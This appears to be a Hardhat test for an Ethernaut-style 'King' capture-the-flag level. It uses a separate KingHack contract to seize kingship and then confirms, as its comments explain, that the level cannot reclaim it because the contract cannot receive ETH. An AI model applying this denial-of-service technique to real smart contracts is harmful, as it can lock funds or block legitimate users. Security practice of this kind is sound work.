import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

const INSERT_COIN = ethers.utils.parseEther("0.001");

describe("King exploit", () => {
  async function deployKingFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const KingFactory = await ethers.getContractFactory("KingFactory");
    const kingFactory = await KingFactory.connect(deployer).deploy();
    await kingFactory.deployed();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const kingAddress = await kingFactory
      .connect(attacker)
      .callStatic.createInstance(attacker.address, { value: INSERT_COIN });

    const tx = await kingFactory.connect(attacker).createInstance(attacker.address, { value: INSERT_COIN });
    await tx.wait(1);

    // Load the instance at returned address
    const king = await ethers.getContractAt("King", kingAddress);

    const KingHack = await ethers.getContractFactory("KingHack");
    const kingHack = await KingHack.connect(deployer).deploy();
    await kingHack.deployed();
    return { attacker, kingFactory, king, kingHack };
  }

  it("Should stop level from claiming kingship", async () => {
    const { attacker, kingFactory, king, kingHack } = await loadFixture(deployKingFixture);

    // Perform hack. This causes the KingHack contract to assume kingship of the King contract.
    let tx = await kingHack.hack(king.address, { value: INSERT_COIN });
    await tx.wait(1);

    const kingBeforeSubmit = await king._king();

    // Simulate submit instance to get success value.
    const success = await kingFactory.connect(attacker).callStatic.validateInstance(king.address, attacker.address);
    expect(success).to.be.true;

    // Submit the instance
    // Since the KingHack contract does not have receive or payable fallback functions, level cannot reclaim kingship.
    tx = await kingFactory.connect(attacker).validateInstance(king.address, attacker.address);
    await tx.wait(1);

    const kingAfterSubmit = await king._king();

    expect(kingBeforeSubmit).to.equal(kingAfterSubmit, "Attack Failed!!!");
  });
});
